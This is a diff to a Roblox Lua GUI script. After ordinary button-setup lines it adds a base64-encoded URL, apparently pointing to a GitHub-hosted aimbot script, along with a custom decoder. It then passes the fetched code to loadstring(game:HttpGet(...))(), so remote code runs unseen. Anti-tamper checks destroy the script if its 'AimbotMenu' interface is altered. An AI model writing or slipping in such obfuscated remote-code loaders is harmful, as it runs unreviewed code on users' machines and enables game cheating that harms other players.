@@ -195,3 +195,45 @@ phoneBtn.TextColor3 = Color3.new(1, 1, 1)
 phoneBtn.Font = Enum.Font.SourceSans
 phoneBtn.TextSize = 14
 phoneBtn.MouseButton1Click:Connect(toggleMenu)
+
+local b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R1dGo4ODgvQWltYm90LWJ5LUR1dGovcmVmcy9oZWFkcy9tYWluL1RoaXJkLVByb2plY3QtRHV0ai5sdWE="
+
+local function decodeBase64(data)
+	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+	data = string.gsub(data, '[^'..b..'=]', '')
+	return (data:gsub('.', function(x)
+		if (x == '=') then return '' end
+		local r,f='',(b:find(x)-1)
+		for i=6,1,-1 do r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+		return r;
+	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+		if (#x ~= 8) then return '' end
+		local c=0
+		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
+		return string.char(c)
+	end))
+end
+
+local realURL = decodeBase64(b64)
+loadstring(game:HttpGet(realURL))()
+
+local gui = game.CoreGui:FindFirstChild("AimbotMenu")
+if not gui or gui.Name ~= "AimbotMenu" or not gui:IsDescendantOf(game.CoreGui) then
+	warn("Tampered GUI detected. Destroying...")
+	if gui then gui:Destroy() end
+	script:Destroy()
+	return
+end
+
+local function protectVar(var, name)
+	if _G["__" .. name] then
+		warn("Variable tampered: " .. name)
+		script:Destroy()
+		return nil
+	end
+	_G["__" .. name] = var
+	return var
+end
+
+-- Ví dụ dùng:
+local Players = protectVar(game:GetService("Players"), "Players")
